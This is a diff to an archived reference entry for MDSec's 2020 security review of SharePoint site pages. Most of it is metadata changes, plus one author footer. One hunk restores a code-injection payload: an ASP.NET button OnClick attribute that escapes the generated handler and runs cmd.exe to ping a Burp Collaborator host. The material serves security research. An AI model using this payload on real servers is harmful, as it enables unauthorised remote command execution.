@@ -6,9 +6,9 @@ resource: "https://www.mdsec.co.uk/2020/03/a-security-review-of-sharepoint-site-
 tags: [article, webseclist-reference, en, mdsec, rce, injection, aspnet, dotnet, filter-bypass, file-upload, case-study, owasp-a03-2021, owasp-a05-2021]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-09T05:25:26+00:00"
+  at: "2026-08-16T00:00:49+00:00"
 status: stable
-stale_after: 2027-08-09
+stale_after: 2027-08-16
 sources:
   - id: original
     resource: "https://www.mdsec.co.uk/2020/03/a-security-review-of-sharepoint-site-pages/"
@@ -24,7 +24,7 @@ canonical_url: ""
 cited_by:
   - "2020.md:45"
 commit: ""
-content_sha256: 345bc15f327bbdeda29a5b7ab17dcbdcc935734f8901d795f2a6067a39c54e3f
+content_sha256: 4db171b00ce5298fe78a6818fd280d890d9bf7e2be632d4c400688f4d3dfe121
 depth: full
 depth_reason: default
 kind: article
@@ -37,7 +37,7 @@ publisher_english: ""
 raw_sha256: 8534278e2488b8e2454953daeef9d787e9493053447976c6c6383a40d79f0ac5
 retrieved_from: "https://www.mdsec.co.uk/2020/03/a-security-review-of-sharepoint-site-pages/"
 retrieved_kind: stored
-retrieved_utc: "2026-08-09T05:25:26+00:00"
+retrieved_utc: "2026-08-16T00:00:49+00:00"
 slug: 2020-mdsec-security-review-sharepoint-site-pages
 snapshot: 20201123165550
 title_english: ""
@@ -51,7 +51,7 @@ translation_of: ""
 
 - Published: 2020-03-10
 - Original: <https://www.mdsec.co.uk/2020/03/a-security-review-of-sharepoint-site-pages/>
-- Preserved from: https://www.mdsec.co.uk/2020/03/a-security-review-of-sharepoint-site-pages/ (stored) on 2026-08-09
+- Preserved from: https://www.mdsec.co.uk/2020/03/a-security-review-of-sharepoint-site-pages/ (stored) on 2026-08-16
 - Capture timestamp: 20201123165550
 - Licence: unknown
 
@@ -242,7 +242,7 @@ This setting easily blocked inline scripts, event attributes, useful expressions
 We have found a method to execute commands via event attributes and perhaps that’s why they are blocked as inline scripts:
 
 ```
-<asp:Button id="Button1"    Text="Apply Image Alignment"  runat="server"/>
+<asp:Button id="Button1"    Text="Apply Image Alignment" OnClick='x);return @__ctrl;}Object/**/test2=System.Diagnostics.Process.Start("cmd.exe","/c ping dsdssd.jzmubrc7b4iom5zs53xnt0jroiu8ix.burpcollaborator.net");private void x(Object sender,EventArgs e){}private int f(int @__ctrl){//' runat="server"/>
 ```
 
 The above code could be injected to the compiled code if event handlers were allowed.
@@ -289,3 +289,9 @@ It is recommended to read more about *SPVirtualPathProvider* if you are interest
 - [Stack Exchange Q&A](https://sharepoint.stackexchange.com/questions/79514/difference-between-pageparserpath-and-safecontrol)
 
 This blog post was written by Soroush Dalili.
+
+ ![Avatar](https://www.mdsec.co.uk/wp-content/plugins/wp-user-avatar/images/wpua-96x96.png)
+
+ written by
+
+#### Dominic Chell
